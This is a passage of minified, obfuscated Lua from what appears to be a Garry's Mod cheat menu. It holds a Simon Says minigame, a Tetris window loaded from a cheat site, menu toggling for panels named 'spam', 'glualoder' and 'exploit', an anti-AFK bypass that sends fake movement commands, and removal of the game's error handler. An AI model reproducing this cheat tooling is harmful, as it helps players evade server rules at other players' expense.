end;timer.Simple(0.9,function()a.simon_lightUpColor=0 end)if a.DjfyuSeq>a.Rhjd then a.Djfyu=false;a.DjfyuSeq=0;return end;a.DjfyuSeq=a.DjfyuSeq+1 end;hook.Add("Think","3213",function()if a.Djfyu==true then S()end end)local function T()local ae=a.Rhjd;local d={}local df={num=a.Rhjd,color=math.random(1,4)}table.insert(a.Hhfg,df)a.Djfyu=true end;local function aP()G()end;local function av()a.Whd=1;a.jFun={}a.Rhjd=a.Rhjd+1;T()S()end;local function dg()for bV=1,a.Whd do if a.Hhfg[bV].num~=a.jFun[bV].num or a.Hhfg[bV].color~=a.jFun[bV].color then return true end end;return false end;local function ax(a7,a8)if a.Djfyu then return end;if a.Egfh~=true then return end;a.fYbg=a7;local df={num=a.Whd,color=a7}table.insert(a.jFun,df)if dg()==true then a.Wgjyhb=true;timer.Simple(2,function()aP()end)return end;if a.Whd==a.Rhjd then av()return end;a.Whd=a.Whd+1 end;local function a9()local a8=vgui.Create("DFrame")a8:SetTitle("")a8:SetSize(400,500)a8:SetPos(ScrW()/2-a8:GetWide()/2-300,ScrH()/2-a8:GetTall()/2)a8:MoveTo(ScrW()/2-a8:GetWide()/2,ScrH()/2-a8:GetTall()/2,0.25,0)a8:SetVisible(true)a8:SetDraggable(false)a8:MakePopup(true)a8.OnRemove=function()if a.simon_hiscores==true then a.simon_highscorePanel:Remove()a.simon_hiscores=false;return end;aP()end;a8.Paint=function()surface.SetDrawColor(Color(0,0,0,250))surface.DrawRect(0,24,a8:GetWide(),380)surface.SetTextColor(Color(255,255,255))surface.SetFont("default")surface.SetTextPos(8,384)surface.DrawText("Score: "..a.Rhjd)if a.Egfh then local aa;surface.SetDrawColor(Color(26,188,156))surface.DrawRect(242,380,45,18)surface.SetTextPos(246,383)if a.Djfyu then aa="WATCH"else aa="REPEAT"end;if a.Wgjyhb then aa="FAILED"end;surface.DrawText(aa)end end;local dh=vgui.Create("DButton",a8)dh:SetText("")dh:SetSize(192,170)dh:SetPos(4,28)dh.OnCursorEntered=function()dh.entered=true end;dh.OnCursorExited=function()dh.entered=false end;dh.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==1 then aw=255 elseif a.Djfyu==false and dh.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(46,204,113,aw))surface.DrawRect(0,0,dh:GetWide(),dh:GetTall())end;dh.DoClick=function()ax(1,a8)end;local m=vgui.Create("DButton",a8)m:SetText("")m:SetSize(192,170)m:SetPos(204,28)m.OnCursorEntered=function()m.entered=true end;m.OnCursorExited=function()m.entered=false end;m.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==2 then aw=255 elseif a.Djfyu==false and m.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(231,76,60,aw))surface.DrawRect(0,0,dh:GetWide(),dh:GetTall())end;m.DoClick=function()ax(2,a8)end;local ad=vgui.Create("DButton",a8)ad:SetText("")ad:SetSize(192,170)ad:SetPos(4,206)ad.OnCursorEntered=function()ad.entered=true end;ad.OnCursorExited=function()ad.entered=false end;ad.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==3 then aw=255 elseif a.Djfyu==false and ad.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(241,196,15,aw))surface.DrawRect(0,0,dh:GetWide(),dh:GetTall())end;ad.DoClick=function()ax(3,a8)end;local ay=vgui.Create("DButton",a8)ay:SetText("")ay:SetSize(192,170)ay:SetPos(204,206)ay.OnCursorEntered=function()ay.entered=true end;ay.OnCursorExited=function()ay.entered=false end;ay.Paint=function()local aw;if a.Djfyu and a.simon_lightUpColor==4 then aw=255 elseif a.Djfyu==false and ay.entered==true then aw=200 else aw=50 end;surface.SetDrawColor(Color(52,152,219,aw))surface.DrawRect(0,0,dh:GetWide(),dh:GetTall())end;ay.DoClick=function()ax(4,a8)end;local aA=vgui.Create("DButton",a8)aA:SetText("")aA:SetSize(100,38)aA:SetPos(a8:GetWide()/2-aA:GetWide()/2,408)aA.OnCursorEntered=function()aA.entered=true end;aA.OnCursorExited=function()aA.entered=false end;aA.Paint=function()local aw;local aa="START"if a.Egfh then return end;if aA.entered==true then aw=100 else aw=200 end;surface.SetDrawColor(Color(0,200,0,aw))surface.DrawRect(0,0,aA:GetWide(),aA:GetTall())surface.SetTextColor(Color(255,255,255))surface.SetFont("DermaLarge")surface.SetTextPos(aA:GetWide()/2-41,4)surface.DrawText(aa)end;aA.DoClick=function()if a.Egfh==true then return end;a.Egfh=true;T()S()end end;a.Rhjd=nil;if a.Rhjd==nil then a.Rhjd=1 end;G()a9()end)a2("Tetris",3,57+27,48,25,doplpanel,function()local a=vgui.Create("DFrame")a:SetSize(359,501)a:Center()a:SetTitle("")a:MakePopup()a.Paint=function(R,G,S)draw.RoundedBox(0,0,0,G,S,b.windowbg)draw.RoundedBox(0,0,0,G,22,b.titlebar)draw.SimpleText("Tetris","hack_font_18",5,2.5,b.titletext)surface.SetDrawColor(b.border)surface.DrawOutlinedRect(0,0,G,S)end;local e=vgui.Create("DPanel",a)e:SetPos(3,24)e:SetSize(353,474)local w=vgui.Create("DHTML",e)w:SetPos(-9,0)w:SetSize(370,474)w:OpenURL("https://exechack.cc/metaconstract/tetris/")end)end)end,52)menulist:Hide()function show()dq:Show()menulist:Show()if a1["spam"]then cP:Show()end;if a1["logs"]then cF:Show()end;if a1["itemlist"]then cZ:Show()end;if a1["glualoder"]then di:Show()end;if a1["exploit"]then cW:Show()end end;function hide()dq:Hide()menulist:Hide()if a1["spam"]then cP:Hide()end;if a1["logs"]then cF:Hide()end;if a1["itemlist"]then cZ:Hide()end;if a1["glualoder"]then di:Hide()end;if a1["exploit"]then cW:Hide()end end;local dI,dJ,er=0,0,0;hook.Add("Think","fff",function()if t["MISC_ANTIANTIAFK"]and IsInGame()then if input.IsKeyDown(KEY_W)or input.IsKeyDown(KEY_S)or input.IsKeyDown(KEY_D)or input.IsKeyDown(KEY_A)then er=0 else er=er+1 end;if er>1000 then RunConsoleCommand("+forward")timer.Simple(0.3,function()RunConsoleCommand("-forward")end)er=0 end end;if input.IsKeyDown(t["MENU_OPENKEY"])and dJ==0 then if dI==0 then gui.ActivateGameUI()show()dI=1 elseif dI==1 then gui.HideGameUI()hide()dI=0 end;dJ=1;timer.Simple(0.3,function()dJ=0 end)end end)end)hook.Remove("OnLuaError","MenuErrorHandler")